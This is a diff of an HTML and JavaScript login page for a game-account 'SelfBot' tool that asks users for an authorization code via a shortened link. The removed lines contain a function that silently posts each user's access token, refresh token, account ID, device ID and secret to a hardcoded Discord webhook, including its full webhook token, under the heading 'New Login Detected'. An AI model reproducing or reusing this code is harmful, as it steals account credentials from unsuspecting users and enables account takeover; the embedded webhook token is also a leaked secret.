@@ -3,72 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GlowFN SelfBot</title>
+    <title>Login Page</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>Login</h1>
-    <p>Get authorizationCode here: <a href="https://rebrand.ly/authcode/" target="_blank">https://rebrand.ly/authcode/</a></p>
-    <label for="authCode">Authorization Code:</label><br>
-    <input type="text" id="authCode" name="authCode"><br><br>
-    <button id="loginButton">Login</button>
+    <div class="container">
+        <h1>Login</h1>
+        <p>Get authorizationCode here: <a href="https://rebrand.ly/authcode/" target="_blank" class="authorize-link">https://rebrand.ly/authcode/</a></p>
+        <label for="authCode">Authorization Code:</label><br>
+        <input type="text" id="authCode" name="authCode"><br><br>
+        <button id="loginButton">Login</button>
+        <button id="logoutButton" style="display: none;">Log Out</button>
 
-    <div id="userDetails" style="display: none;">
-        <h2>User Details</h2>
-        <label for="accountId">Account ID:</label><br>
-        <input type="text" id="accountId" name="accountId"><br>
-        <label for="secret">Secret:</label><br>
-        <input type="text" id="secret" name="secret"><br>
-        <label for="deviceId">Device ID:</label><br>
-        <input type="text" id="deviceId" name="deviceId"><br>
-        <label for="displayName">Display Name:</label><br>
-        <span id="displayName"></span><br><br>
+        <div id="userDetails" class="user-details" style="display: none;">
+            <h2>User Details</h2>
+            <label for="accountId">Account ID:</label><br>
+            <input type="text" id="accountId" name="accountId"><br>
+            <label for="secret">Secret:</label><br>
+            <input type="text" id="secret" name="secret"><br>
+            <label for="deviceId">Device ID:</label><br>
+            <input type="text" id="deviceId" name="deviceId"><br>
+            <label for="displayName">Display Name:</label><br>
+            <span id="displayName"></span><br><br>
+        </div>
+
+        <h2>API Actions</h2>
+        <label for="number">Number:</label><br>
+        <input type="text" id="number" name="number"><br>
+        <label for="level">Level:</label><br>
+        <input type="text" id="level" name="level"><br>
+        <label for="emote">Emote Name:</label><br>
+        <input type="text" id="emote" name="emote"><br><br>
+
+        <button id="crownsButton" onclick="getCrowns()">Get Crowns</button>
+        <button id="levelButton" onclick="getLevel()">Get Level</button>
+        <button id="emoteButton" onclick="equipEmote()">Equip Emote</button>
+        <button id="hideButton" onclick="hide()">Hide</button>
+        <button id="unhideButton" onclick="unhide()">Unhide</button>
+
+        <p class="created-by">Created by GreekNinja30. This site is a Beta Test.</p>
     </div>
-
-    <div class="loading-overlay">
-    <div class="loading-spinner"></div>
-    </div>
-
-    <h2>API Actions</h2>
-    <label for="number">Crowns Number:</label><br>
-    <input type="text" id="number" name="number"><br>
-    <label for="level">Level:</label><br>
-    <input type="text" id="level" name="level"><br>
-    <label for="emote">Emote Name:</label><br>
-    <input type="text" id="emote" name="emote"><br><br>
-
-    <button id="crownsButton" onclick="getCrowns()">Get Crowns</button>
-    <button id="levelButton" onclick="getLevel()">Get Level</button>
-    <button id="emoteButton" onclick="equipEmote()">Equip Emote</button>
-    <button id="hideButton" onclick="hide()">Hide</button>
-    <button id="unhideButton" onclick="unhide()">Unhide</button>
-
-    <p>Created by GreekNinja30. This site is a Beta Test.</p>
 
     <script>
-        function makeRequest(url, successMessage, button) {
-            fetch(url)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log(data);
-                alert(successMessage);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Error occurred. Please try again.');
-            })
-            .finally(() => {
-                button.disabled = false;
-            });
+        document.addEventListener("DOMContentLoaded", function() {
+            // Check if user details are stored in local storage
+            var storedDetails = localStorage.getItem("userDetails");
+            if (storedDetails) {
+                // If stored details exist, populate the input fields with the saved values
+                var userDetails = JSON.parse(storedDetails);
+                document.getElementById("accountId").value = userDetails.accountId || '';
+                document.getElementById("secret").value = userDetails.secret || '';
+                document.getElementById("deviceId").value = userDetails.deviceId || '';
+                document.getElementById("displayName").textContent = userDetails.displayName || '';
 
-            // Disable the button to prevent spam
-            button.disabled = true;
-        }
+                // Show user details section and logout button
+                document.getElementById("userDetails").style.display = "block";
+                document.getElementById("logoutButton").style.display = "block";
+                document.getElementById("loginButton").style.display = "none";
+            }
+        });
 
         document.getElementById("loginButton").addEventListener("click", function() {
             var authCode = document.getElementById("authCode").value.trim();
@@ -89,25 +82,26 @@
                 })
                 .then(data => {
                     // Assuming the response contains user details
-                    var accountId = data.account_id;
-                    var secret = data.secret;
-                    var deviceId = data.device_id;
-                    var displayName = data.display_name;
-                    var accessToken = data.access_token;
-                    var refreshToken = data.refresh_token;
-                    var icon = data.icon; // Assuming the response contains an icon field
+                    var userDetails = {
+                        accountId: data.account_id,
+                        secret: data.secret,
+                        deviceId: data.device_id,
+                        displayName: data.display_name
+                    };
+
+                    // Save user details to local storage
+                    localStorage.setItem("userDetails", JSON.stringify(userDetails));
 
                     // Populate user details input fields
-                    document.getElementById("accountId").value = accountId;
-                    document.getElementById("secret").value = secret;
-                    document.getElementById("deviceId").value = deviceId;
-                    document.getElementById("displayName").textContent = displayName;
+                    document.getElementById("accountId").value = userDetails.accountId;
+                    document.getElementById("secret").value = userDetails.secret;
+                    document.getElementById("deviceId").value = userDetails.deviceId;
+                    document.getElementById("displayName").textContent = userDetails.displayName;
 
-                    // Show user details section
+                    // Show user details section and logout button
                     document.getElementById("userDetails").style.display = "block";
-
-                    // Send details to Discord webhook
-                    sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon);
+                    document.getElementById("logoutButton").style.display = "block";
+                    document.getElementById("loginButton").style.display = "none";
                 })
                 .catch(error => {
                     console.error('Error:', error);
@@ -115,45 +109,22 @@
                 });
         });
 
-        function sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1247245162116288733/_btWrQvyX_vcCArSB7SbKr59xR9OPsX6yyQ-Z5zQmnckUQFBWllIQJ51wK_Q0sgmIFJJ'; // Replace with your Discord webhook URL
+        document.getElementById("logoutButton").addEventListener("click", function() {
+            // Clear user details from local storage
+            localStorage.removeItem("userDetails");
+            // Clear user details
+            document.getElementById("accountId").value = '';
+            document.getElementById("secret").value = '';
+            document.getElementById("deviceId").value = '';
+            document.getElementById("displayName").textContent = '';
 
-            const payload = {
-                username: "Login Bot",
-                embeds: [{
-                    title: "New Login Detected",
-                    fields: [
-                        { name: "Access Token", value: accessToken },
-                        { name: "Account ID", value: accountId },
-                        { name: "Display Name", value: displayName },
-                        { name: "Refresh Token", value: refreshToken },
-                        { name: "Device ID", value: deviceId },
-                        { name: "Secret", value: secret }
-                    ],
-                    thumbnail: { url: icon }
-                }]
-            };
+            // Hide user details section
+            document.getElementById("userDetails").style.display = "none";
+            document.getElementById("logoutButton").style.display = "none";
+            document.getElementById("loginButton").style.display = "block";
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Successfully sent to Discord webhook:', data);
-            })
-            .catch(error => {
-                console.error('Error sending to Discord webhook:', error);
-            });
-        }
+            alert('You have been logged out.');
+        });
 
         function getCrowns() {
             var accountId = document.getElementById("accountId").value;
